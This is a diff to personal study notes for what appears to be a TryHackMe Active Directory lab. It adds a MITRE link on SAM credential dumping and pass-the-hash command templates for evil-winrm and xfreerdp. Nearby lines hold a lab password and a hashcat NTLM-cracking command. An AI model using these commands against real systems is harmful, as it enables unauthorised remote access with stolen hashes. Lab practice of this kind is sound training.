@@ -98,6 +98,9 @@ xfreerdp /v:10.10.222.63 /u:THM\Mark /p:M4rk3t1ng.21
 
 ## Memo
 
+- http://attack.mitre.org/techniques/T1003/002/
+- https://youtu.be/L26Xq7m0uQ0
+
 ### Victim AD
 
 ```powershell
@@ -125,12 +128,19 @@ hashcat -m 1000 hashes.txt wordlist.txt
 ### Shell
 
 ```bash
+#win-rm protocol
 evil-winrm -i <ip> -u <account> -p <password>
+
+#pass the hash
+evil-winrm -i <ip> -u <account> -H <hash>
 ```
 
 ```bash
 #remote desktop protocol
 xfreerdp /v:<ip> /u:<account> /p:<password>
+
+#pass the hash
+xfreerdp /v:<ip> /u:<account> /pth:<hash>
 ```
 
 ## Lab AD
